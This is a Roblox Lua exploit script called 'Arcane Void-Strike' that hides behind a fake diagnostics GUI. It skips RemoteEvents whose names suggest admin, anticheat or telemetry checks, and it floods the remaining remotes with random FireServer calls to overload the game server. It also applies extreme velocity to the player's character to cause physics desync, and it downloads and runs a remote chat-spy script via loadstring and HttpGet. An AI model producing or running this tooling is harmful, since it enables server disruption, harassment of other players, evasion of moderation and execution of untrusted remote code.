--[[ 
    🔱 ARCANE VOID-STRIKE v1.2 [GHOST-STEALTH] 🔱
    "They set traps. We walk through the walls. <3"
    
    SECURITY UPDATE:
    - Intelligent Honey-pot Blacklist (DevTools, Admin, etc.)
    - Pattern-Neutral Payload
    - Advanced Jittering v2
    - Anti-Kick Fail-safe
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. STEALTH NOTIFIER
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "GHOST SIGNAL",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 3
        })
    end)
end

-- 2. UI CAMOUFLAGE (Internal Diagnostics)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "NetworkDiagnostics_v2"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 280)
Main.Position = UDim2.new(0.5, -160, 0.5, -140)
Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 30)
Header.BackgroundColor3 = Color3.fromRGB(20, 20, 25)

local Title = Instance.new("TextLabel", Header)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "SYSTEM_OPTIMIZER_v1.2"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Font = Enum.Font.Code
Title.TextSize = 12
Title.BackgroundTransparency = 1

local function createGhostBtn(name, y, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 40)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(30,32,35)
    btn.Text = name
    btn.TextColor3 = Color3.new(1,1,1)
    btn.Font = Enum.Font.Gotham
    btn.MouseButton1Click:Connect(callback)
end

-- 3. THE GHOST ENGINE (With Blacklist)
local active = { loop = false }

-- HONEY-POT BLACKLIST (Keywords that trigger kicks)
local BLACKLIST = {
    "devtools", "admin", "kick", "ban", "report", "mod", 
    "security", "check", "verify", "anticheat", "log", "telemetry",
    "debug", "internal", "staff"
}

local function isSafe(name)
    local n = name:lower()
    for _, word in pairs(BLACKLIST) do
        if n:find(word) then return false end
    end
    return true
end

local function getSafeTargets()
    local t = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then
            table.insert(t, v)
        end
    end
    return t
end

createGhostBtn("🔥 EXECUTE [GHOST_NUCLEAR]", 50, function()
    active.loop = not active.loop
    ntf(active.loop and "GHOST OVERRIDE ACTIVE" or "OVERRIDE TERMINATED")
    
    if active.loop then
        task.spawn(function()
            local targets = getSafeTargets()
            if #targets == 0 then return ntf("No safe vectors found.") end
            
            while active.loop do
                local burstSize = math.random(5, 15)
                for i = 1, burstSize do
                    if not active.loop then break end
                    local r = targets[math.random(1, #targets)]
                    if r and r.Parent then
                        -- Payload "Neutre" (Imite une requête de data normale)
                        local fakeData = Http:GenerateGUID(true)
                        pcall(function() r:FireServer(fakeData, true, 0) end)
                    end
                end
                -- Jitter aléatoire agressif
                task.wait(0.1 + math.random() * 0.2)
            end
        end)
    end
end)

createGhostBtn("⚡ PHYS_DESYNC_V2", 100, function()
    ntf("PHYS_MOD_ACTIVE")
    task.spawn(function()
        local hrp = L.Character and L.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            for i = 1, 300 do
                hrp.Velocity = Vector3.new(math.random(-5e5, 5e5), 300, math.random(-5e5, 5e5))
                RS.Heartbeat:Wait()
            end
        end
    end)
end)

createGhostBtn("👁️ ACTIVATE_SIGNAL_TRACE", 150, function()
    ntf("TRACING SIGNALS...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Arcane-Project/Public/main/CHAT_SPY_SUPREME.lua"))()
end)

createGhostBtn("🛑 EMERGENCY_EXIT", 200, function()
    active.loop = false
    ntf("SYSTEM_STABLE")
end)

ntf("GHOST_STEALTH READY. Trap detection: ON.")
